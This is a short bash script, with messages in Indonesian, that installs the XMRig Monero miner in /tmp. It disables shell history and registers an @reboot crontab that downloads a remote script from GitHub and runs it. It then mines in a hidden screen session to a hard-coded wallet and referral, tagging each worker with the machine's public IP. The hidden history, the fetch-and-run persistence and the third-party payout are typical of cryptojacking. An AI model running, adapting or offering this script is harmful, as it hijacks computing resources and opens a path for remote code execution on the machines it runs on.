#!/bin/bash
#SETTING
coin="XMR"
wallet="42M74QufEQ6Z6AdRVgukPRSr3faQ4oZgSDJjxer9FFyGYhvWQH7xb8qasS4YVjv9sYhj3Ckq9NCMUhibA8nyJCtMTAKUMP1"
referral="qatv-8924"
#TEMPORARY DISABLE HISTORY
set +o history
#
user=$("whoami")
ip=$(curl -s https://checkip.amazonaws.com | sed 's/\./_/g')
#DOWNLOAD XMRIG, DEFAULT DIRECTORY /tmp
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-static-x64.tar.gz -O /tmp/unmine.tar.gz
cd /tmp/ && tar -xzvf unmine.tar.gz
rm -rf unmine.tar.gz
mv /tmp/xmrig-6.12.2 /tmp/unmine
#CREATING CRONTAB RUN XMRIG AFTER REBOOT
url="https://raw.githubusercontent.com/fhaa123/miner/master/unmine.sh"
if crontab -l | grep "@reboot cd /var/tmp && curl -O $url">/dev/null 2>&1 ; then
  echo "Crontab already exist!"
  echo "Skiping...!"
else
  echo "Creating crontab run after reboot.."
  (crontab -u $user -l; echo "@reboot cd /tmp && curl -O $url && bash /tmp/unmine.sh" ) | crontab -u $user -
fi
#START MINING IN BACKGROUND
cd /tmp/unmine &&screen -dmS unmine ./xmrig -o rx.unmineable.com:3333 -a rx -k -u $coin:$wallet.$ip#$referral
#
echo "Gunakan CTRL +AD untuk keluar dari screen."
echo "Gunakan screen -r unmine untuk melihat mining."
sleep 3
secs=$((10))
while [ $secs -gt 0 ]; do
   echo -ne "Redirecting to miner $secs\033[0K\r"
   sleep 1
   : $((secs--))
done
screen -r unmine
